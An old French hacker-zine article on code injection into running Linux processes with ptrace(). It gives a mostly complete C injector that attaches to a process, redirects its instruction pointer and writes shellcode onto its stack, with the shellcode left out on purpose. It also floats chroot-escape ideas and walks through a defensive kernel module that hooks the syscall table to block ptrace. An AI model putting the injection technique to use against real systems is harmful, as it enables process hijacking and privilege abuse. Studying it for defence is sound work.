@@ -1,0 +1,527 @@
+-------------------------------------------------------------------------------
+0x07         ptrace() for fun and profit                              4n0nym0uZz
+-------------------------------------------------------------------------------
+
+
+
+
+
+
+[SOMMAIRE]
+
+
+  I/   Avertissement
+
+
+  II/  Introduction
+
+
+  III/ ptrace()
+
+
+  IV/  Injection
+
+
+  V/   Implémentation
+
+
+  VI/  Patch
+
+
+  VII/ References
+
+
+  VII/ Greetz
+
+
+
+
+
+
+
+  I/ Avertissement
+  ________________
+
+
+
+Tout  ce  dont il  est  question dans  cet article a  été testé  sur mon propre
+système, et  aucun  disfonctionnement  n'a  été  noté  par la suite. Je ne vous
+encourage  pas  a  tester  celà  sur  des  systèmes ne vous appartenant pas. Si
+néanmoins  vous  avez  envie de mettre en application le contenu de cet article
+sur  un  système  n'étant  pas a vous, en cas d'ennui (genre si vous plantez le
+système) ce n'est pas moi qu'il faudra remettre en cause.
+
+
+
+
+
+
+  II/ Introduction
+  ________________
+
+
+Bon  donc  dans  cet  article,  je  vais  vous  parler  de  ptrace(),  et  plus
+précisément  d'une  fonctionnalité  que ce  syscall implémente : l'injection de
+données.  Cette  technique  est  loin d'etre récente et il en est question dans
+le  Phrack#59  (salut  à  l'anonymous  qui a  réalisé   un  de   ces   articles
+d'ailleurs  :)).  Je  vais  donc  expliquer comment injecter du code en parlant
+des  étapes  essentielles  de  l'injection  (attache au processus, recuperation
+des  adresses...).  En  meme  temps  que  cet  article,  vient  un bout de code
+provenant  de  mon  implémentation,  un  simple  injecteur  utilisant ptrace(),
+mais  il  ne  sera  pas  distribué  complètement pour des raisons diverses (par
+conséquent  le  code  est   *quasiment  inutilisable*,   mais   est  facilement
+reconstituable afin d'avoir un injecteur fonctionnel - simple mesure anti
+*gros kiddies*).
+
+Au fait (je crois que je le dis plus loin ça aussi), pour avoir les dernieres
+versions des codes sources présentés ici, pointez vous soit sur mon site (je ne
+donne pas l'url, mais ceux qui savent qui je suis sauront la retrouver) soit sur
+le site de IOC. Idem pour ce paper en fait, car il y a pas mal de choses a voir
+dans ce domaine, et très peu sont couvertes dans ce paper, donc de temps en
+temps je rajouterai des trucs...
+
+
+
+
+
+
+  III/ Ptrace
+  ___________
+
+
+Bon, pour l'utilite de ptrace() ainsi que son utilisation, je vais supposer
+que vous etes assez matures pour celà, c'est vous renvoyer a la page de
+manuel de ce syscall :
+
+  $ man 2 ptrace
+
+Et là vous apprenez des tas de choses intéressantes. Vous voyez que ptrace()
+est l'appel système numéro 26 (eax,26); que son premier parametre (ebx) est
+le type de requête, le deuxième (ecx) est le PID du programme a tracer, le
+troisième (edx) est l'addresse mémoire dans laquelle il faut lire/écrire les
+données passées en quatrieme parametre (esi).
+
+La requete a passer en premier parametre (ebx) doit soit etre par exemple
+"PTRACE_PEEKTEXT", soit sa valeur numérique (1). Pour avoir la liste des
+requetes ainsi que leurs valeurs numériques, je vous renvoie au fichier
+sys/ptrace.h.
+
+Voici quelques informations sur le fonctionnement de ptrace()...pour celà je
+vais d'abord revenir sur quelques notions sur le système UNIX, a commencer
+par la notion de processus (car certaines notions ne sont pas connues de
+tous). Chaque processus comporte une structure (task_struct) appellée
+"descripteur de processus" ("process descriptor") qui contient énormément
+d'infos sur lui même. Je vais tenter plus ou moins de faire le schéma de
+cette structure (attention je sux trop des ballz en ascii art) :
+
+
+state
+flags
+
+need_resched
+counter
+priority
+
+next_task		----->
+prev_task		----->
+next_run		----->
+prev_run		----->		/ --------->tty_struct
+                                       |            (tty associé au process)
+p_optr			----->	       |
+p_pptr			----->         |
+......                                 |  /-------->fs_struct
+			               | |          (répertoire courant)
+                                       | |
+                                       | |
+tty			---------------/ |  /------>files_struct
+                                         | |        (pointeurs vers les fd)
+                                         | |
+                                         | |
+                                         | |
+                                         | |
+tss                                      | |  /---->mm_struct
+                                         | | |      (pointeurs vers les mrd)
+                                         | | |
+                                         | | |
+fs			-----------------/ | | /--->signal_struct
+files			-------------------/ | |    (signaux reçus)
+mm			---------------------/ |
+signal_lock		-----------------------/
+sig
+
+...
+
+tty_struct,fs_struct,files_struct,mm_struct et signal_struct se réfèrent aux
+ressources appartenant au processus, mais ça on s'en fout. En fait j'ai
+juste fait ce schéma pour faire joli. Non plus exactement pour attirer votre
+attention sur deux trucs : p_optr et p_pptr. En gros ça correspond au
+processus père original, et au processus père tout court. Le premier
+(p_optr) est un pointeur vers le descripteur de processus père original (quand
+il est encore vivant) ou vers "init" s'il est mort (cet enfoiré là).
+Le deuxième (p_pptr) est un pointeur vers le descripteur de processus père
+actuel. En général c'est la meme chose que p_optr, mais nous allons voir par
+la suite que ça peut changer...
+
+En effet, lorsque l'on utilise ptrace(PTRACE_ATTACH,pid,.....), la structure
+de "pid" est modifiée de sorte que son p_pptr soit celui du processus qui
+fait le ptrace. Une fois qu'on finit (ptrace(PTRACE_DETACH.......)) la
+valeur de p_pptr est remplacée par celle de p_optr.
+
+
+
+  IV/ Injection
+  _____________
+
+Bien donc dans cet article, je vais parler de l'injection de code dans un
+processus [j'en profite au passage pour préciser qu'il s'agit là d'une forme
+d'infection de processus en runtime, il ne s'agit pas de l'infection du
+binaire en lui même]. Le code présenté ci dessous n'est qu'une sorte de
+proof of concept, car vous ne pourrez pas faire grand chose.
+
+Imaginez un vieux serveur apache, vulnérable, mais a l'intérieur d'un
+chroot. Un hacker exploite le apache et il est root, mais à l'intérieur du
+chroot. Imaginez un autre hacker, dans la meme situation, qui utilise un
+exploit avec un shellcode injectant un code permettant de casser le chroot
+dans un programme extérieur au chroot. Vous avez certainement deviné ou je
+veux en venir. Mais pour celà il faut que ptrace() soit autorisé à
+l'extérieur de l'environnement chrooté(). En [3] vous trouverez un article
+qui décrit exactement celà.
+
+Je ne vais carrément pas vous expliquer comment sortir d'un chroot, juste
+donner deux trois idées comme ça dans le vent, mais par exemple si vous etes
+root dans l'environnement chrooté, vous pouvez encore éventuellement charger
+un LKM qui fera plus ou moins ce que vous voulez, ou encore créer des
+devices en local qui vous permettront d'accéder en mode natif à la mémoire
+ou au système de fichiers (afin par exemple de récupérer des pointeurs en
+dehors du chroot() et d'agir dessus, là ça peut être fun). Bon je persiste a
+dire que le mieux reste l'injection ptrace() car vous faîtes faire presque
+ce que vous voulez aux processus. Une technique assez ancienne qui ne marche
+plus consistait a faire un double chroot(), une autre consistait a faire un
+chroot() sans chdir() [6] (méthode testée sur une machine sans grsecurity).
+Enfin disons que toutes ces techniques que je vous évoque au dessus sont là
+pour faire beau, car après réflexion je n'arrive pas à voir de quelle
+manière je peux les utiliser dans cet article vu qu'il n'y aurait carrément
+aucun rapport - le truc de base étant l'injection ptrace...le seul lien
+entre tout ça et mon article est que ça sert a sortir d'un chroot()...
+
+Enfin bref...
+
+Il existe quelques solutions à celà, comme empecher l'exécution de ptrace()
+tout simplement (sur un serveur de production, avoir ptrace() ne sert a rien
+du tout), ou bien empêcher ptrace() de s'attacher à des processus situés à
+l'extérieur de l'environnement chrooté. Le patch pour le Kernel Linux
+Grsecurity fait celà. A noter également que ce patch intègre diverses autres
+protections pour empecher le cassage de chroot().
+
+Donc passons à l'action, voyons comment nous pouvons faire celà de manière
+simple : je vous laisse une grande partie du code source...
+
+
+
+
+
+  V/ Implementation
+  _________________
+
+
+Au début je pensais filer le code source de mon injecteur, mais en fin de
+compte je préfère le distribuer sous forme de binaire (compilé avec gcc
+2.96). N'en soyez point troublés, il y a 90% du code source ci dessous...
+
+/*
+ * pr00f 0f c0nc3pt c0d3
+ * by 4n0bym0uZ
+ * f0r The IOC Magazine
+ * (c) 2003
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/ptrace.h>
+#include <linux/user.h>
+#include <sys/wait.h>
+
+#include <ncurses.h>  // that's a kind of magick...
+
+void usage(char *progname)
+{
+  printw("Usage: %s <pid to infect>\n",progname);
+  refresh();
+  getchar();
+  endwin();
+  exit(-1);
+}
+
+int intro(void)
+{
+  printw("pr00f 0f c0nc3pt c0d3 by 4n0nym0uZ 0f\n");
+  printw("The Input / Output Corporation\n");
+  printw("pr3ss 4ny k3y...b3 gh3y...ph34r !!\n");
+  refresh();
+  getchar();
+  return(0);
+}
+
+char *message = "" ;   /* ici faut en fait mettre un shellcode qui fait un
+char *shellcode;        * write avec le texte qu'on veut */
+void i_sc();           /* han ! il vous faudra la recoder :) */
+int ptr,begin,i=0,erreurs;  /* plein de variables a la con */
+struct user_regs_struct data;  /* c'est dedans qu'on va stocker les regs */
+pid_t pid;     /* là on va caler le pid */
+
+int main(int argc, char **argv)
+{
+  initscr();
+  intro();
+  if (argc != 2)   /* achtung achtung ! */
+  {
+    usage(argv[0]);
+  }
+
+  pid = atoi(argv[1]);	// voilà qui est fait
+
+  shellcode = malloc(strlen((char *)i_sc) + strlen(message) + 4);
+  strcpy(shellcode,(char *)i_sc);
+  strcat(shellcode,(char *)message);/* on concatene le shellcode et le msg*/
+
+  printw("n0w try1ng t0 Xpl01t pr0c3ss numb3r %d...\n",pid);
+  refresh();
+
+  sleep(1);	// va savoir pourquoi j'ai mis ça (je viens de découvrir cette fonction)
+
+  /* là donc on va s'attacher au processus */
+
+  if ((erreurs = ptrace(PTRACE_ATTACH,pid,NULL,NULL)))
+  {
+    printw("un4bl3 t0 4tt4ch to l33t pr0c3ss %d \n",pid);
+    refresh();
+    endwin();
+    exit(-1);
+  }
+
+  waitpid(pid,NULL,0);
+
+  /* on récupère la liste des registres qu'on stocke dans la structure
+   * data */
+
+  if ((erreurs = ptrace(PTRACE_GETREGS,pid,NULL,&data)))
+  {
+    printw("un4bl3 t0 g3t r3gZ st4te...\n");
+    refresh();
+    exit(-1);
+  }
+
+  printw("%%eip	=	0x%.8lx\n",data.eip);
+  printw("%%esp	=	0x%.8lx\n",data.esp);
+
+  refresh();
+
+  ptr = begin = data.esp - 512;
+
+  printw("n0w 1nj3ct1ng THE SHELLCODE\n");
+  printw("Injecting at : %.8lx\n", (long)begin);
+  refresh();
+
+  data.eip = (long) begin;
+
+  /* On remplace les anciens registres par les nouveaux... */
+
+  if ((erreurs = ptrace(PTRACE_SETREGS,pid,NULL,&data)));
+  {
+    refresh();
+    endwin();
+    exit(-1);
+  }
+
+  /* tant qu'on est pas au bout de shellcode[] on copie bit par bit
+   * ce qu'il contient a l'adresse donnée */
+
+  while (i < strlen(shellcode))
+  {
+    ptrace(PTRACE_POKETEXT,pid,ptr, (int) *(int *)(shellcode + i));
+    i += 4;
+    ptr += 4;
+  }
+
+  /* Puis au final on se détache */
+
+  ptrace(PTRACE_DETACH,pid,NULL,NULL);
+  refresh();
+  endwin();
+  return(0);
+}
+
+
+
+
+
+
+
+  VI/ Patch
+  _________
+
+
+Le 17 mars 2003, le monde entier (enfin...les gens conscients des problèmes
+de sécurité dirons nous) apprend l'existence d'une faille de sécurité
+touchant le syscall ptrace(). Toutes les versions du kernel de la plus basse
+2.2 a la plus élevée 2.4 (2.4.20 à l'époque) inclue étaient vulnérables (au
+passage, la version 2.4.21 est sortie il y a moins d'une semaine). Avant
+qu'un patch ne soit disponible, je me suis mis en tête de développer un
+module de kernel (bon vous êtes pas des beunets non plus je pense, on va
+appeller ça un LKM) qui permet d'empecher l'utilisation de ptrace. Je vais
+vous expliquer pas à pas comment coder ce patch (et en vous fournissant bien
+entendu mon code au cas ou vous n'y arriveriez pas tout seul), mais avant
+tout, on va revenir sur ce que sont les LKM...je vais pour celà vous conter
+une histoire...
+
+Celà commence a l'époque des kernels 2.0, nous situons cette époque aux
+alentours de l'an de grâce 1997. De plus en plus de matériel et de
+fonctionalités sont supportées par le noyau du système Linux - conséquence,
+on risque de se retrouver avec des kernels de plus en plus gros. Donc des
+gens (attention oui c'est pas n'importe qui, ce sont des gens !) ont eu
+l'idée (fabuleuse ?) de mettre au point un système de codes kernel qui
+implémentent une fonction que l'on aimerait bien voir utilisée dans un
+kernel, sans avoir a le recompiler, et sans que le kernel prenne plus de
+place.
+
+Pas tout non plus ne peut être mis en LKM, il peut arriver que pour le petit
+truc dont on a besoin, nous n'ayons le choix qu'entre une compilation
+statique (le driver est directement intégré au kernel), ou bien pas de
+compilation du tout (on ne peut pas faire plus explicite :)). Dans ces cas
+là, c'est par exemple qu'une des fonctions dont on a besoin nécessite par
+exemple une modification d'une structure de données...Pour un exemple bien
+détaillé, je vous renvoie a l'annexe B1 du livre "Le Noyau Linux" [1].
+
+Pour  charger  un  module en mémoire, le moyen le plus simple est de passer par
+la commande "insmod" ("insert module").Pour une utilisation un peu plus avancée
+et  évoluée  qu'une  simple  insertion  de module, je vous renvoie a la page de
+manuel  de  insmod(8). Là  je  ne  vais  carrément  pas  m'attarder sur comment
+se passe une insertion de module,là encore et toujours je vous renvoie au livre
+"_Le Noyau Linux_". Pour  lister  les  modules, le  moyen  le  plus  simple est
+d'utiliser  la  commande  "lsmod" ("list modules"), et pour supprimer un module
+de la mémoire, il faut utiliser la commande "rmmod" ("remove module").
+
+Bon, maintenant, trêve de plaisanteries, passons a la programmation d'un
+module qui sera utile et (in)intéressant...
+
+On commence tout d'abord par caler une référence a la sys_call_table dans
+notre module. La sys_call_table c'est un tableau qui énumère la liste des
+syscalls ainsi que leurs adresses. L'adresse est tout simplement le numéro
+du syscall. Le nom du syscall est de la forme SYS_machintruc (par exemple
+SYS_exit). Donc que disais-je ? ha oui, eh bien donc on va intégrer la
+sys_call_table. Heureusement (non pas qu'il y a Findus) que les gens qui ont
+mis ce système au point ont pensé a la déclarer en extern...ajoutez donc
+cette ligne dans votre module :
+
+  extern void *sys_call_table[];
+
+Ensuite nous allons créer un pointeur qui pointera vers l'adresse du syscall
+ptrace original. Ceci peut nous etre utile par exemple si nous voulons tout
+rétablir sans avoir a rebooter...
+
+  int (*orig_ptrace)(int,int,int,int);
+
+Peut etre vous demandez vous ce que vient foutre ici un (int,int,int,int),
+mais la réponse est simple : consultez le man de ptrace, vous aurez la
+réponse (un indice : regardez le prototype de la fonction).
+
+Nous allons a présent construire NOTRE syscall ptrace. Pour celà, on ne va
+carrément pas se faire chier, on va s'inspirer du prototype qui existe déjà:
+
+  int n_ptrace(int req,int pid, int addr, int data);
+
+Vous ouvrez les crochets ("{") et a l'intérieur vous mettez ce que vous
+voulez que ce nouveau syscall fasse, en tenant bien entendu compte du fait
+que le module sera exécuté en kernel land, et que donc l'utilisation des
+instructions de la glibc ne sera pas possible (comme printf(3) par exemple).
+Dans mon exemple, je fais afficher une connerie genre "appel a ptrace - b3
+gh3y" en utilisant la fonction printk(). Ensuite, vu que notre but est
+d'empecher ptrace de fonctionner, nous allons utiliser return() pour lui
+faire croire ce qu'on veut. On consulte la page man de ptrace(2) et on
+regarde les valeurs renvoyées en cas d'erreur. Pour ma part j'aime bien
+EPERM donc c'est ce que je vais utiliser. Voyons donc ce que notre code va
+donner :
+
+  {
+    printk("appel a ptrace - b3 gh3y");
+    return EPERM;
+  }
+
+Voilà. Avec ce bout de code on a presque 90% de notre module qui est fait.
+Maintenant ce qu'il nous reste a faire, c'est remplacer le vieux ptrace()
+par le notre (qui tient quand meme en deux lignes), et pour ça, il faut
+corrompre la sys_call_table (c'est le mal !). Rassurez vous, ce n'est pas
+bien compliqué. On commence d'abord par faire pointer l'adresse de
+sys_ptrace vers son lieu de repos...oups de sauvegarde, qu'on a déclaré un
+tout petit peu plus haut...
+
+  orig_ptrace = sys_call_table[SYS_ptrace];
+
+Et on remplace ce ptrace là (qui nous sert plus a rien, du moins dans
+l'immédiat) par notre ptrace a nous...
+
+  sys_call_table[SYS_ptrace] = n_ptrace;
+
+On met celà dans la fonction init_module. Haaaa j'allais oublier, la
+fonction init_module() c'est l'équivalent du main() d'un programme
+classique. Bon donc on fout ça dans init_module() et on met un return(0);
+pour terminer. Là on a fait 95% du boulot.
+
+Que se passe-t-il s'il nous prend l'envie de supprimer le module ? (parce
+qu'il est méchant par exemple). Eh bien il suffit juste de restaurer le
+syscall original, pour celà, on va faire comme on a fait pour le dégager du
+milieu...à part que ça sera l'inverse, hahaha :
+
+  sys_call_table[SYS_ptrace] = orig_ptrace;
+
+Et on va planquer ça dans la fonction cleanup_module() qui est..hmmm...la
+fonction qui est appelée dès qu'un module est supprimé de la mémoire via
+rmmod. Maintenant vous devriez pouvoir vous coder un module qui tient la
+route. Au cas ou vous n'y arriveriez pas, vous pouvez toujours regarder le
+code que je vous file en annexe (patchtrace.tar.gz).
+
+Ce  patch  empeche  donc  tout  utilisateur  de  faire  un  ptrace(),  et  donc
+l'exploit  ptrace  de  mars  2003  ne  marche  plus,  mais  la ptrace injection
+aussi.  Il  est  possible  d'autoriser  juste  le  root a faire un ptrace, mais
+dans  ce  cas  là  la  protection  contre  l'injection n'a plus de sens dans le
+cadre  d'un  shellcode  faisant un ptrace() (par exemple pour infecter un autre
+processus)  car  le  ptrace()  sera  exécuté en root (le shellcode aura fait un
+setreuid(0,0)  avant  bien  évidemment)  et dans ce cas il ne sera en aucun cas
+restreint par le module. Dans ce cas il faut bloquer la requete PTRACE_POKETEXT
+mais  Neofox  de  IOC a codé un module faisant celà. Je l'ai également joint en
+annexe.
+
+
+
+
+
+  VII/ References
+  _______________
+
+[1] Page de manuel de ptrace() [man 2 ptrace]
+[2] _Le Noyau Linux_ (_Understanding the Linux Kernel_) - Daniel P. Bovet &
+    Marco Cesati - Editions O'Reilly
+    (http://www.oreilly.com)
+[3] Building ptrace injecting shellcodes - anonymous - Phrack59 article 12
+    (http://www.phrack.org/show.php?p=59&a=12)
+[4] Runtime process infection - anonymous - Phrack 59 article 8
+    (http://www.phrack.org/show.php?p=59&a=8)
+[5] Grsecurity (http://www.grsecurity.net)
+[6] Using chroot() securely
+    http://www.linuxsecurity.com/feature_stories/feature_story-99.html
+
+
+
+
+
+
+  VIII/ Gr33tZzZz
+  _______________
+
+
+Je tiens a remercier certaines personnes, que je ne vais pas citer, mais qui
+sauront probablement se reconnaître pour tout ce qu'elles m'apportent.
+Encore une fois merci.
